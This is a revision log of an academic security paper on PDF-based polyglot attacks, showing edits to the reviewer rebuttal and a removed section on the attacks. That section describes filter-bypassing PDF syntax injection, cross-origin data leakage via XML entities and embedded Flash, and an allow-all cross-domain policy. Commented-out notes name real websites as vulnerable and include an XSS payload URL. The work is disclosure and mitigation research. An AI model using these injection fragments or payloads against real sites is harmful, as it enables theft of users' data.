-malicious HTML. Taking into account previous instances of similar attacks, we show that the issue 
-extends beyond content-sniffing, and how other formats can be abused in a web context, thereby 
-generalizing the polyglot attack pattern.
+Barth et al. show how a carefully crafted file of a benign format can manipulate the
+browser's content-sniffing algorithm into rendering the file as malicious HTML. With this
+and other similar attacks as a starting point, we show that the issue extends beyond
+content sniffing and demonstrate how other formats can be abused in a web context, thereby
+generalizing polyglot-based attacks.
 
-As proposed, we plan to make the claims of generality more precise, with our high-level
-presentation of polyglots and their abuse possibilities as general, and the focus on new
-PDF-based attacks as particular. Similarly, we agree it is a good idea to clarify the
-general vs. particular aspects of mitigation.
+Following the suggestion, we plan to make the claims of generality more precise, with our
+high-level presentation of polyglots and their abuse possibilities as general, and the
+focus on new PDF-based attacks as particular. Similarly, we agree it is a good idea to
+clarify the general vs. particular aspects of mitigation.
 
@@
 
-The novelty of this paper is twofold; generalizing polyglot attacks, and showing a practical 
-example of a vulnerable format. We show how the flexibility of the PDF format makes it ideal for 
+The novelty of this paper is twofold: generalizing polyglot attacks and showing a practical 
+example of a vulnerable format. We show how the flexibility of the PDF format accommodates 
 hiding a malicious PDF document in a benign format. We also discuss PDF as a delivery mechanism 
@@
 Evaluation of mobile browsers would indeed make an interesting addition, and certainly one we 
-would like to delve further into.
+would like to delve into further.
 
@@
 
-As suggested, we plan to make the treatment of the related work more coherent. Also, as suggested, 
-the visualization will be updated for a more professional appearance, and the listings moved to 
-their appropriate positions. Finally, all typos have been corrected, and we are working on 
-clarifying the complex sections, starting from your suggestions.
+As suggested, we plan to make the treatment of the related work more coherent. Also, we
+are happy to follow the suggestion to update the visualization with a more professional
+appearance and to move the listings to their appropriate positions.
 

### 2013-06-29 rebuttal.txt
Updated the rebuttal and fixed typo in the article.

@@
 The novelty of this paper is twofold: generalizing polyglot attacks and showing a practical 
-example of a vulnerable format. We show how the flexibility of the PDF format accommodates 
-hiding a malicious PDF document in a benign format. We also discuss PDF as a delivery mechanism 
-for an embedded malicious Flash. The resulting polyglot has the flexibility of PDF and the 
-capabilities of PDF and Flash combined.
+example of a vulnerable format. As mentioned, malicious PDFs or Flash is no surprise. However, we 
+show how the flexibility of the PDF format accommodates hiding such	a malicious PDF document in a 
+benign format. We also discuss PDF as a delivery mechanism for an embedded malicious Flash. The 
+result has the flexibility of PDF to be crossbred with other formats, and the capabilities of PDF 
+and Flash combined.
 
@@
 server itself (as opposed to the web application), since the web server makes the final
-decision on the supplied content-type. This can help mitigate both syntax injection and
-content smuggling.
+decision on the supplied content-type. This co-operation between client and server can help 
+mitigate both syntax injection and content smuggling. A proof-of-concept implementation would 
+require minimal adjustments on both client- and server-side and an evaluation could be done easily.
 
-Evaluation of mobile browsers would indeed make an interesting addition, and certainly one we 
-would like to delve into further.
+The evaluation may well be too focused on PDF-based polyglot attacks, and would benefit from more 
+general tests. Evaluation of mobile browsers would indeed make an interesting addition, and 
+certainly one we would like to delve into further.
 
@@
 
-It would have been interesting to delve into more surprising formats.
-The paper from Barth et al.
-looks at malicious PostScript, and PDF, while not being quite as bad, has certainly suffered from its share of problems.
+It would have been interesting to delve into more surprising formats. The paper from Barth et al. 
+looks at malicious PostScript, and PDF, while not being quite as bad, has certainly suffered from 
+its share of problems.
 
@@
 
-The evaluation for this paper felt somewhat pro forma.
-I would have rather seen a more extensive set of tests against the individual browsers, and perhaps to have considered mobile web browsers as well.
+The evaluation for this paper felt somewhat pro forma. I would have rather seen a more extensive 
+set of tests against the individual browsers,
+
+### Jonas ###
+# THe evaluation is indeed focused on PDF-based polyglots, thereby not making it general 
+#############
+
+and perhaps to have considered mobile web browsers 
+as well.
 
@@
 
-Where I think the paper was particularly lacking was on the mitigation side.
-For a venue such as this, I would have liked to have seen an implementation of one of the mitigation solutions and a full evaluation of security and performance.
-This could be done either on the browser or server side.
-Without that, this paper has more of an informational feel to it.
+Where I think the paper was particularly lacking was on the mitigation side. For a venue such as 
+this, I would have liked to have seen an implementation of one of the mitigation solutions and a 
+full evaluation of security and performance. This could be done either on the browser or server 
+side. Without that, this paper has more of an informational feel to it.
 
 ### Jonas ###
-# To Andrei: Again this could be improved upon with the new mitigation technique. It would even be simple to
-# implement and evaluate. What to do?
-#
+# This mitigation technique 
+# Implementing this mitigation technique would require adjustments on both
 #

### 2013-06-30 rebuttal.txt
no message

@@
-We would like to thank the reviewers for the valuable feedback.
+Thank you to the reviewers for the valuable feedback.
 
@@
 browser's content-sniffing algorithm into rendering the file as malicious HTML. With this
-and other similar attacks as a starting point, we show that the issue extends beyond
-content sniffing and demonstrate how other formats can be abused in a web context, thereby
+and similar attacks as a starting point, we show that the issue extends beyond content
+sniffing and demonstrate how other formats can be abused in a web context, thereby
 generalizing polyglot-based attacks.
@@
 
-The novelty of this paper is twofold: generalizing polyglot attacks and showing a practical 
-example of a vulnerable format. As mentioned, malicious PDFs or Flash is no surprise. However, we 
-show how the flexibility of the PDF format accommodates hiding such	a malicious PDF document in a 
-benign format. We also discuss PDF as a delivery mechanism for an embedded malicious Flash. The 
-result has the flexibility of PDF to be crossbred with other formats, and the capabilities of PDF 
-and Flash combined.
+The novelty of this paper is twofold: generalizing polyglot attacks and showing a
+practical example of a vulnerable format. As mentioned, malicious PDFs or Flash is no
+surprise. However, we show how the flexibility of the PDF format accommodates hiding such
+a malicious PDF document in a benign format. We also discuss PDF as a delivery mechanism
+for an embedded malicious Flash. The result has the flexibility of PDF to be crossbred
+with other formats, and the capabilities of PDF and Flash combined.
 
-As for other vulnerable formats, future work mentions scriptable media formats, e.g., Advanced 
-Streaming Format (ASF), as another problem area. However, space constraints prohibits us from 
-further exploring these formats within the scope of this paper.
+As for other vulnerable formats, future work mentions scriptable media formats, e.g.,
+Advanced Streaming Format (ASF), as another problem area. However, space constraints
+prohibits us from further exploring these formats within the scope of this paper.
 
@@
 
-Regarding more advanced defenses, we will be happy to include in the paper a discussion of
-most promising directions in this space. For example, note that when content is loaded in
-a specific context, as it is in the case of the paper, the browser already has exact
-knowledge as to what type it will interpret the requested content as. A natural defense
-technique can be to send the expected type along with the request. The web server then
-can compare the types and react accordingly. Further, it can be implemented in the web
-server itself (as opposed to the web application), since the web server makes the final
-decision on the supplied content-type. This co-operation between client and server can help 
-mitigate both syntax injection and content smuggling. A proof-of-concept implementation would 
-require minimal adjustments on both client- and server-side and an evaluation could be done easily.
+We are convinced the mitigation techniques we suggest are both most needed and
+realistically deployable. Regarding more advanced defenses, we will be happy to include in
+the paper a discussion of most promising directions. For example, note that when content
+is loaded in a specific context, as it is in the case of the paper, the browser already
+has exact knowledge as to what type it will interpret the requested content as. A natural
+defense technique can be to send the expected type along with the request. The web server
+then can compare the types and react accordingly. Further, it can be implemented in the
+web server itself (as opposed to the web application), since the web server makes the
+final decision on the supplied content-type. This cooperation between client and server
+can help mitigate both syntax injection and content smuggling.
 
-The evaluation may well be too focused on PDF-based polyglot attacks, and would benefit from more 
-general tests. Evaluation of mobile browsers would indeed make an interesting addition, and 
-certainly one we would like to delve into further.
+Evaluation of mobile browsers would indeed make an interesting addition, and certainly one
+we would like to delve into further.
 
@@
 
-As suggested, we plan to make the treatment of the related work more coherent. Also, we
-are happy to follow the suggestion to update the visualization with a more professional
-appearance and to move the listings to their appropriate positions.
+We plan to make the treatment of the related work more coherent. Also, we are happy to
+follow the suggestion to update the visualization with a more professional appearance, to
+move the listings to their appropriate positions and generally clarify the exposition
+where appropriate.
 

### 2013-08-08 main.tex
Updated the rebuttal and fixed typo in the article.
Literally just removed a comma.
no message

@@
 XSS attacks are relatively well understood by researchers and
-developers~\cite{XSSED}. Known defense include various
+developers~\cite{XSSED}. Known defenses include various
 flavors of \emph{sanitization} on server side and the
@@
 An attacker can use a polyglot to infiltrate a vulnerable origin.
-Once infiltrated, the polyglot is embedded in the attackers web site using a plug-in.
+Once infiltrated, the polyglot is embedded in the attacker's web site using a plug-in.
 According to the SOP, content loaded in a plug-in is considered to belong to the 
@@
 due to its standing as the most commonly used reader. To give a comparison, the 
-Google Chrome built-in PDF reader, was selected as it is the default reader to 
-user of the browser.
+Google Chrome built-in PDF reader was selected as it is the default reader to 
+users of the browser.
 

### 2013-08-08 main.tex
no message

@@
 There are several classes of cross-domain attacks that circumvent SOP.
-The OWASP top 10 list~\cite{OWASP:top10:2010} places \emph{injection}
-and \emph{cross-site scripting} (XSS) attacks as two top security
+The OWASP top 10 list~\cite{OWASP:top10:2013} places both \emph{injection}
+and \emph{cross-site scripting} (XSS) attacks among the three top security
 risks for web applications.
@@
 An attacker can use a polyglot to infiltrate a vulnerable origin.
-Once infiltrated, the polyglot is embedded in the attacker's web site using a plug-in.
+Once infiltrated, the polyglot is embedded from within the attacker's web site,
+so that the polyglot is loaded in the browser's plug-in.
 According to the SOP, content loaded in a plug-in is considered to belong to the 
@@
 
-Another example of problematic elements include the \emph{object} and
+Other examples of problematic elements include the \emph{object} and
 \emph{embed} tags. These 
@@
 In a cross-site scripting attack user input is used to compose an HTML document. 
-Fragments of HTML-syntax in the input alters the semantic of the document to 
+Fragments of HTML syntax in the input alters the semantic of the document to 
 execute attacker supplied 

### 2013-08-11 main.tex
Progress on the TODO list

--- 2013-06-27 main.tex
@@
 
-\subsection{PDF-based polyglots}
-\label{sec:pdf-based-polyglots}
-Several design choices in the PDF specification make the format particularly 
-suitable for making polyglots. One such design choice is the error tolerant 
-parser. This is in part motivated by another design choice namely PDF being a container format. 
-%of which the 
-This implies
-%implication is 
-that a PDF file can, by design, contain foreign syntax that 
-could interfere with the syntax of the file. Another motivation is that PDF 
-files are designed to be both forward- and backward-compatible. Readers 
-implementing an older version of the specification do not recognize new 
-features and behave as if they were not present in the file. 
-%
-The implementation notes of the specification describes some exceptions to the
-requirements of the specification, such as the header can occur 
-anywhere within the first 1024 bytes of the file. This flexibility gives plenty of room for 
-combining with syntax of another format.
-%
-The specification declares many components to be required in a
-PDF file, but as can be seen in Section~\ref{sec:format}, in practice several 
-components can be omitted~\cite{Wolf:CCC10}. The code in Listing~\ref{lst:minimal-pdf} shows the 
-minimal syntax required for a malformed, but valid PDF file.
-%incrementally 
-%updated by appending updated versions of existing objects to 
-%the end of the file. In fact, 
-%and formats. This and the fact that it is designed to be robust against errors,
-%provides us with a format that is powerful, flexible and ideal for creating
-%malicious polyglots.
-
-\begin{lstlisting}[label=lst:minimal-pdf, caption=Minimal PDF file]
-%PDF-
-trailer<</Root<</Pages<<>>>>>>
-\end{lstlisting}
-
-% - Execute JavaScript
-% - Embed Flash files
-% - Launch commands
-% - Network requests
-
-Furthermore the PDF format is of particular interest to us because of its 
-many capabilities. Some examples include executing JavaScript, launching commands, 
-and issuing HTTP requests. The HTTP requests are restricted to the origin of the 
-PDF file, and will include any cookies associated with that origin. 
-Adobe Reader also includes a Flash 
-runtime to play embedded Flash files on systems that do
-not have the Flash runtime installed. %Considering that it might be a conscious decision
-%of the user to refuse a flash player,
-
-%\subsection{Embedded PDF documents}
-
-When a PDF document is embedded in a web page, the corresponding plug-in 
-is executed to render the content. Recall from Section~\ref{sec:cross-origin} 
-that the plug-in is selected based 
-on the MIME-type, either supplied by the server or in the type attribute
-%
-with preference for the later.
-%
-Also recall
-that the browser rely on the plug-in to handle the situation when the MIME-type 
-supplied by the server is inconsistent with the MIME-type of the plug-in.
-In the case of the Adobe Reader plug-in, it disregards the MIME-type
-supplied by the server and will attempt to interpret any content as PDF. 
-Listing~\ref{lst:embed-pdf} shows how 
-arbitrary content can be rendered as PDF format.
-
-\begin{lstlisting}[label=lst:embed-pdf, caption=HTML for embedding PDF content]
-<embed type="application/pdf" 
-src="vulnerable.com/?input=%PDF...">
-\end{lstlisting}
-
-In recent versions of Adobe Reader certain measures have been taken to prevent 
-creating PDF-based polyglots. In accordance with our recommendations, Adobe Reader 
-has made the parsing more strict by attempting to match the first bytes of the 
-file against a set of known signatures. If 
-a match is found, the parser will abort loading of the document. 
-However, this does not fully defend against PDF-based polyglot attacks.
-The problem of 
-this approach is that there are a number of file formats that lack a reliable 
-signature, e.g., HTML. Also, for this approach to be reliable, the signature 
-must match the signature enforced by other interpreters of the format. A notable 
-counterexample is the signature used for the JPG format. While the signature is 
-correct according to the specification of the format, several JPG interpreters
-will allow slightly malformed signatures. Such a malformed signature will bypass 
-the check in Adobe Reader and still be rendered correctly in a viewer. This opens up for PDF-based
-polyglot attacks.
-
-\subsection{PDF attacks}
-
-As explained in Section~\ref{sec:vectors} there are two vectors for polyglot 
-attacks; \emph{syntax injection} and \emph{content smuggling}. PDF is a suitable 
-format for both vectors as it is both a text based format with error tolerant parsing, 
-and has widespread acceptance as a document format, often preferred over 
-other document formats.
-
-\subsubsection{Syntax injection}
-\label{sec:pdf-injection}
-As the scenario details in Section~\ref{sec:injection}, the attacker in a syntax 
-injection attack manipulates a vulnerable service to include PDF syntax in existing content, e.g. HTML-documents.
-The PDF syntax is typically injected through user input used by the vulnerable service in the composition of documents.
-%
-An example of a suitable fragment to inject is shown in Listing~\ref{lst:xml-pdf}.
-%
-The resulting content is subsequently 
-embedded in the attackers page as PDF, as exemplified in Listing~\ref{lst:embed-pdf}.
-As mentioned in Section~\ref{sec:pdf-based-polyglots}, the embedded PDF can issue 
-requests to the origin it came from, carrying the cookies associated with that origin.
-These requests allow for the extraction of sensitive user data that can either be 
-communicated back to the attacker, or be leveraged in further attacks.
-
-Thus far, exploitation of vulnerable services have been discussed, excluding the specific 
-conditions under which a service is vulnerable. In order to exploit the 
-vulnerability, the injected syntax must pass through any existing filters 
-unchanged or at least with its semantics preserved. If user input in an 
-HTML-document is not sanitized, any syntax would be unchanged and 
-the service is vulnerable to less sophisticated attacks, e.g. cross-site scripting, 
-therefore sanitized user input is of greater concern.
-%
-Based on the PDF samples in Listings~\ref{lst:minimal-pdf} and~\ref{lst:xml-pdf}, we can derive 
-the set of tokens required to build a PDF. Assuming that alpha-numeric characters 
-pass through a sanitization filter unmodified, the set of tokens is $\{\%, <<, >>, /\}$.
-As can be noted, there is a small but significant overlap with the tokens of HTML, 
-which implies that many web sites protected against cross-site scripting attacks 
-are also protected against PDF-based polyglot attacks. One of the problems of 
-filtering input for inclusion in a web page are the many contexts in which the 
-input can be included. A problem made even more complex by the diversity of 
-languages the page contains. Language incompatibilities force context dependent 
-filtering, where the same input is treated differently based on the context in 
-which it is included. In certain contexts angle brackets are often left untouched by filters.
-
-\paragraph{HTML comments}
-No HTML enclosed in comments, "$<$--" and "--$>$", will be rendered, and therefore 
-filters consider this context safe. To prevent input from escaping the comment by 
-injecting an end comment token, certain filters remove any occurrences of "--$>$", 
-but leave the rest of the input untouched. HTML comments are meaningless to PDF, 
-and the result is a valid HTML/PDF polyglot.
-
-\paragraph{JavaScript strings}
-In an in-line JavaScript context, user input is often included in the shape of a 
-JavaScript string, delimited by single or double quotes. In this context only a 
-few characters require encoding, as they can break the string context. Naturally, 
-any single or double quotes need escaping, as well as any carriage return or 
-line feed characters. In the spirit of making minimal changes to the input, 
-certain web sites only escape these characters. This is sufficient to prevent cross-site 
-scripting attacks, but fail to protect against PDF-based polyglot attacks.
-
-Not only in-line JavaScript fall short in this regard. JavaScript object notation 
-(JSON) is used in modern web sites as a data transport. This is particularly 
-common in web sites that provide an API to interact with the offered services.
-JSON encoded information suffer the same problem as in-line JavaScript, thereby
-extending the attack surface further.
-
-\subsubsection{Content smuggling}
-
-Due to the nature of the PDF, it can without much effort be combined with just 
-about any other format. This provides ample opportunity to create malicious 
-polyglots where PDF is either the benign or the malicious format. Consequently, 
-this significantly expands the attack surface, making it important to take 
-measures to protect against these attacks.
-
-\paragraph{PDF as the benign format}
-%\todo{Services that accept PDFs, PDFs can be used to hide another malicious format}
-Services like job brokers commonly let the user upload a CV in the form of a PDF-file.
-Before such PDF-files are published to recruiters, they are verified to not 
-contain any malicious payload. Such a verification only extends to the PDF format itself.
-An attacker can produce a PDF that is valid and 
-benign, but also a polyglot hiding another malicious format, such as Flash. As 
-described in the content smuggling scenario in Section~\ref{sec:smuggling}, the 
-uploaded PDF file is then embedded on the attacker's web site, but now as the 
-malicious format. Using social engineering, the attacker can persuade 
-the victim to visit the web site.
-
-Creating a PDF/Flash polyglot is no major challenge.
-A proof-of-concept can easily be created by storing the PDF source code as a static string 
-variable in the malicious Flash source code. When compiling Flash, the output is 
-compressed by default to save space, thereby obfuscating the PDF source code. However, tools exist 
-that decompress the Flash files, which restores the plain PDF code.
-
-\paragraph{PDF as the malicious format}
-As detailed in the content smuggling scenario in Section~\ref{sec:smuggling}, the 
-attacker uploads the PDF polyglot to a vulnerable content hosting service. 
-A server-side verification process will base its verification on the benign formats 
-it expects to receive. The polyglot is designed to verify correctly as the benign format,
-and the verification is likely to miss the malicious PDF components, as it is unaware of the alternate interpretation of the content.
-
-Given the extensive capabilities of the PDF format, exploiting a content smuggling 
-vulnerability with a PDF-based polyglot attack, can be done without much effort.
-To prevent the attack, the 
-verification process have to actively search for and remove PDF specific syntax.
-The impact of exploitation depends on the payload used in the attack.
-
-\subsection{PDF payloads}
-%\todo{rewrite section, focus on embedded flash, xxe and code samples}
-%
-As discussed in Section~\ref{sec:payloads}, there are two approaches to exploiting 
-these vulnerabilities; cross-site request forgery, and cross-origin information leakage.
-Both of these require extracting information from the vulnerable service, which is something that can be achieved using the capabilities of the PDF format.
-
-In order to extract information and leak across origins, a communication channel
-is established. PDF documents provide multiple ways of generating HTTP requests; 
-many of which allow cross-origin communication, but are, out of security concerns, only one-way in the sense that 
-the PDF document will never see the result. Therefore, the focus is directed towards 
-two methods that allow bidirectional communication; XML external entities, and embedded Flash. 
- Since the document will retain the 
-origin from which it was served, all 
-requests issued from the document will include any cookies associated with the target origin.
-
-%When embedded in a web page, many of the PDF communication methods utilize
-%the underlying browser to make requests by navigating the browser to the target 
-%URL. This will unload the current page in which the document is embedded. Arbitrary page 
-%navigation is allowed with respect to SOP, since the response is not visible 
-%to the document. Such methods can be used in CSRF attacks, but would 
-%defeat the purpose of requesting information as the document cannot process the 
-%response.
-
-% Cross-origin leaks
-%To leak information across origins, a communication channel is 
-%required between the attacker and the target. PDF provides the necessary means 
-%to mediate this information leakage. The flow of information can be divided into 
-%two steps, extracting information from the target and delivering it to the attacker.
-%Each requiring its own communication methods.
-
-%\subsubsection{The target}
-%There are two methods for a PDF file to communicate with the server it originates from, 
-%both allowing it to read the response: from JavaScript using XML external entities 
-%and from an embedded flash file.
-
-\paragraph{XML External Entities}
-The PDF JavaScript API includes a method to parse XML documents, called 
-XMLData.parse. The XML document being processed may in turn rely on external entities, 
-required for the parsing of the document, which the XML parser will request. The request is 
-bound to the origin of the document, and the response is included in the XML document. 
-The source code of the XML document reflects this response and can be retrieved at a later point,
-resulting in a bidirectional communication channel.
-%
-As the response 
-is included in the XML, the result has to be well-formed XML. This puts a 
-restriction on the content that can be requested using this method. Considering 
-that HTML pages are rarely well-formed this method may be too restricted in practice.
-
-Listing~\ref{lst:xml-pdf} contains an example PDF document that uses XML external 
-entities. Note that the one-way method \emph{getURL} is used to communicate the 
-information back to the attacker. Given the compact size of the example, it is useful for the syntax 
-injection scenario in Section~\ref{sec:injection}, which require injection of 
-small syntax fragments.
-
-As of version 10.1.5, in accordance with our recommendations,  XML external entities 
-has been removed. Thereby the risks of leakage of sensitive information is significantly reduced.
-
-\paragraph{Embedded Flash}
-By embedding a Flash file in the PDF document the capabilities of the format can be 
-extended even further. The Flash runtime supports bidirectional communication in 
-accordance with SOP.
-%
-The embedded Flash inherits the origin of the PDF document, thus it can 
-request and read any document from the originating server. Unlike the XML
-method, there are no restrictions on what content can be requested, thus making 
-it the most versatile of the available communication methods. The only drawback 
-using this approach is the significant increase in terms of file size. Even the compact 
-Flash code in Listing~\ref{lst:flash-pdf} will result in a 6 kB Flash file. 
-This suggests that this method might be better suited for the content smuggling 
-scenario in Section~\ref{sec:smuggling}, rather than the syntax injection scenario.
-
-Cross-origin communication in Flash adheres to the same-origin policy. However, this is not a restriction, since
- Flash also supports cross-origin communication via  
-cross-origin resource sharing. Using CORS, a web server can relax the SOP to allow access to specified content.
-%As mentioned, the embedded Flash file inherits the origin of the document.
-An attacker can set an allow-all cross-origin policy, such as in Listing~\ref{lst:crossdomain}, 
-that open up for two way communication.
-
-\begin{lstlisting}[label=lst:crossdomain, caption=Allow-all crossdomain.xml]
-<?xml version="1.0"?>
-<cross-domain-policy>
-  <allow-access-from domain="*" />
-</cross-domain-policy>
-\end{lstlisting}
-
-%\subsubsection{The attacker}
-%There are a number of ways to communicate with the attacker, either directly 
-%via the embedding page or through the attackers server. As mentioned previously, 
-%many methods trigger page navigation in the browser. This will result in a 
-%noticeable change in the victims browser. While it fulfills the purpose of 
-%leaking information, an attacker can use more covert methods of communication
-%to refrain from alerting the victim.
-
-%\paragraph{Fragment identifier}
-%The methods that navigate the browser can still be used for a somewhat covert 
-%communication with the attacker. Navigating to the same page with a different 
-%fragment identifier will not reload the page. Embedding the information in the fragment 
-%identifier of the URL of the embedding web site, creates a one-way communication 
-%channel from the document to the page. Since the fragment identifier is visible 
-%in the address field of the browser, an alert user would notice it changing.
-
-%\paragraph{PostMessage}
-%The PDF plugin includes an API for communicating directly with the page in 
-%which it is embedded. The document can send messages to the page using 
-%the hostContainer.postMessage method. The page registers a handler to receive 
-%the event and is also able to post messages back to the document.
-%This two way communication is not visible to the victim.
-
-%\paragraph{Embedded Flash}
-
-%3 pages 
-\section{Evaluation}
-\label{sec:eval}
-
-This section details the evaluation performed to investigate the prevalence of 
-the vulnerabilities from Section~\ref{sec:vuln}. The evaluation covers various 
-instances of affected components, such as browsers and PDF interpreters, 
-content sanitization filter, and a study of the Alexa top 100 web sites.
-
-\subsection{Instances}
-
-To better understand how this problem presents itself, a comparison of browser and reader instances 
-is presented. We compare all major browsers and two of the most common readers.
-
-\subsubsection{Readers}
-\label{sec:readers}
-Section~\ref{sec:vuln} focuses on the Adobe PDF Reader as the attack surface, 
-due to its standing as the most commonly used reader. To give a comparison, the 
-Google Chrome built-in PDF reader, was selected as it is the default reader to 
-user of the browser.
-
-As mentioned in Section~\ref{sec:cross}, the browser rely on the reader plug-in to 
-implement correct security measures, in order to prevent cross-domain leakage. 
-Unlike Adobe Reader, the Chrome browser built-in PDF reader refuses to render 
-content that was served with an inappropriate MIME-type if the content is 
-delivered across origins. This effectively prevents the attacks in Section~\ref{sec:vuln}.
-If the Chrome browser is configured to use the Adobe Reader plug-in, it will 
-behave the same as in other browsers and the content will be interpreted as PDF.
-
-\subsubsection{Browsers}
-
-The behavior of cross-domain embedding of PDF resources is studied in the major 
-browsers, i.e., Firefox, Safari, Opera, Google Chrome and Internet Explorer. 
-The study shows that all major browsers are susceptible to the attacks outlined 
-in Section~\ref{sec:vuln}, with some minor differences detailed below and summarized in Table~\ref{tab:comparison}.
-In Table~\ref{tab:comparison}, "Yes" for the columns "object" and "embed" indicates that the 
-corresponding tag can be used to embed a PDF document, and for the column 
-"Adobe is default" it indicates that Adobe Reader is commonly the default PDF reader.
-
-\paragraph{Firefox, Safari and Opera}
-The browsers, Firefox, Safari and Opera, are all susceptible to the attacks outlined as 
-per Section~\ref{sec:vuln}, without any restrictions or modifications.
-
-\paragraph{Internet Explorer}
-Microsoft's browser, Internet Explorer, is susceptible to the attacks. However, 
-it seems to only support embedding of PDF documents using the \emph{embed} tag. 
-This is not a major obstacle in exploiting the vulnerability, as the embed and 
-object tags are interchangeable in this respect.
-
-\paragraph{Google Chrome}
-Google's browser, Chrome, has built-in support for displaying PDF documents. 
-The built-in PDF reader is used by default by the browser, unless it has been 
-explicitly disabled by the user. Certain complex PDF documents can not be 
-handled by the built-in reader. The built-in reader will then prompt the user 
-to open the document in Adobe Reader. As previously noted in Section~\ref{sec:readers}, the built-in reader 
-is not vulnerable to attacks. Hence, Chrome is only susceptible when the Adobe 
-Reader plug-in is used to render the document.
-
-\begin{table}[h!]
-\begin{tabular}{l|c|c|c}
-& object & embed & Adobe is default \\ \hline
-Firefox & Yes & Yes & Yes \\ \hline
-Chrome & Yes & Yes & No \\ \hline
-Safari & Yes & Yes & Yes \\ \hline
-Opera & Yes & Yes & Yes \\ \hline
-Internet Explorer & No & Yes & Yes %\\ \hline
-\end{tabular}
-\caption{Comparison of browsers}
-\label{tab:comparison}
-\end{table}
-%\subsection{Bypassing content filters}
-
-%\subsubsection{Server-side upload filters}
-
-%As discussed in Section~\ref{sec:cross} server-side content filters that 
-%validate files based on content type are not equipped to handle polyglot 
-%content. For polyglot content, specialized filters are required that analyze 
-%the content based on all considerable interpretations of the content. No such 
-%filters were encountered in this study.
-
-%\subsubsection{Cross-site scripting filters}
-%\todo{install NoScript?}
-%This effectively bypasses any cross-site scripting filters such as NoScript or
-%filters built into browsers. Since the Reader plug-in handles the response, the
-%browser never gets to see the content
-
-%\subsubsection{Context sensitive filters}
-
-%Context sensitive cross-site scripting filters, that remove or encode characters
-%Clever filters that adapt their filtering to the context in which the user
-%content is included. Basically filters that allow input that do not form harmfulHTML.
-
-% Don't want to claim something I have no basis for..
-
-\subsection{Alexa top 100}
-We have conducted two
-studies to evaluate the prevalence of the problem on popular sites, 
-covering the Alexa top 100 web sites. Because of their dominance 
-on the web, these web sites are also the most exposed to security threats.
-The first study covers PDF-based polyglot attacks using syntax injection as the 
-infiltration method; the second covers content smuggling.
-%It does not involve polyglot attacks based on content smuggling, as 
-%potential targets generally require authentication before submitting content.
-We refrain from mentioning names of individual web sites to prevent exploitation 
-before the issues have been properly dealt with.
-We are in contact with the maintainers of the web sites to help
-mitigate the vulnerabilities.
-
-\paragraph{Syntax injection}
-The study is based on supplying the web sites with the benign minimal PDF in 
-Listing~\ref{lst:minimal-pdf}, and examining the corresponding responses to this input.
-The sample contains the essential keywords and tokens required to perform a syntax 
-injection based polyglot attack. If these tokens pass through unaltered, the web site is 
-considered vulnerable. The process has been conducted manually and only input 
-parameters on publicly accessible pages, those that do not require authentication, 
-were tested. Considering that most inputs are available only to authenticated 
-users, the results suggests that more web sites are likely vulnerable in input that do
-require authentication.
-
-The conclusion is 
-that nine web sites out of the hundred apply insufficient content filtering with 
-respect to the PDF format. Out of the nine found to be vulnerable; five were 
-susceptible to PDF based polyglot attacks, and four applied 
-insufficient content filtering, but the input was reflected in a way that 
-prevented exploitation, e.g. the header appeared after 1024 bytes.
-%
-%, which have the potential of compromising the 
-%confidentiality and integrity of the web site's users.
-%
-
-Three of the five vulnerable web sites could also be determined to be vulnerable to 
-traditional XSS attacks in the same input parameters. 
-The remaining two web sites found susceptible only to polyglot attacks and not XSS attacks
-are of particular interest since they employ proper measures to protect 
-against XSS attacks, and yet fall short in defeating this new breed of attacks.
-
-\begin{enumerate}
-\item The first web site reflected user input in an inline  
-JavaScript context, inside a string. To prevent cross-site scripting in this 
-context, the following measures were taken: the JavaScript string delimiters 
-and the backslash character were properly escaped, and the 
-string "$<$/script$>$" was removed. These measures are sufficient to protect against XSS attacks, 
-but do not prevent an attacker 
-from injecting valid PDF syntax.
-\item The second web site reflected the user input in an HTML-comment context. 
-The only measure taken to prevent XSS attacks in this context was removing any 
-occurrence of the character sequence "--$>$". Again, while successfully preventing 
-XSS attacks, this measure is ineffective in preventing an attacker from injecting PDF syntax.
-\end{enumerate}
-
-\paragraph{Content smuggling}
-Further, a smaller study was conducted, not covering the full Alexa top 100, but 
-targeting popular cloud storage services. 
-This study is based on polyglot content being uploaded to the service and 
-subsequently analyzed to determine which origin it was served 
-under. We have found two major 
-enterprise cloud storage services to be susceptible to attacks. Both services make an effort to
-follow current best practices, see Section~\ref{sec:smuggling-mitigation}, but 
-fail to cover scenarios for content upload.
-
-The first service serves almost all uploaded content from a sandboxed origin; the exception being the user's 
-avatar image that are served under the sensitive origin. An attacker could 
-upload a specially crafted avatar image that, when embedded as PDF on the attackers 
-web site, can access and modify the contents of the victim's cloud storage.
-
-The second service lets the user publish a public link to an HTML 
-representation of the content. The content is served under the sensitive origin 
-and is therefore carefully processed to prevent 
-generation of malicious HTML, but fails to take other formats into account.
-A specially crafted file will result in the generation of valid PDF syntax that, when embedded as PDF on the attackers 
-web site, can access and modify the contents of the victim's cloud storage.
-
-We are currently advising both service providers to help mitigate these vulnerabilities.
-
-%Baidu.com (allows <>, but escapes /) 
-%LinkedIn (allows <>, but escapes /) 
-%Soso (allows <>, but escapes /) 
-%Youku (vulnerable to traditional XSS) 
-%Soku (vulnerable to traditional XSS) 
-%alibaba.com (allows <>, but escapes /)
-%about.com (vulnerable to traditional XSS,
-%http://linux.about.com/sitesearch.htm?q=XSS&SUName=--%3E%3Cimg+src=x+onerror=alert%281%29%3E)
-%sogou.com (potential target
-%http://www.sogou.com/web?query=%25PDF+%3C%3C+%2F+%3E%3E&_asf=www.sogou.com&_ast=1349689275&w=01019900&p=40040100&sut=11010&sst0=1349689274528)
-
-%1-2 pages 
-\section{Mitigation}
-\label{sec:mit}
-This section gives advice on various mitigation approaches available for each of the
-affected components, both server-side and client-side. It should be noted that 
-preventing polyglot attacks in the general case is a complex task, as one would 
-need to take all potentially malicious formats in to account. Mitigating instances of 
-polyglot attacks based on particular formats are significantly more straightforward.
-
-Note that although some mitigation discussed below is already in place
-(notably as implemented by the Chrome builtin PDF reader), the state of the art
-is far from being satisfactory. As our paper demonstrates, the
-polyglot attacks are a real threat. It is the paper's main value to
-bring attention to polyglot attacks and the importance of
-mitigation against them.
-
-\subsection{Server-side mitigation}
-
-As a content provider on the Internet today there are precautions that one can 
-take to mitigate this class of vulnerabilities. Which precautions to take depend 
-on the kind of services provided. The mitigation recommendations for syntax 
-injection apply to all services that generate content based on user input, and the content smuggling
-recommendations apply to services that serve user-supplied files.
-
-\subsubsection{Syntax injection}
-
-%In the case of PDF; always encode tokens related to the PDF 
-%syntax. Generally, hard to ensure that tokens for all potential 
-%file formats are properly encoded without breaking anything.
-
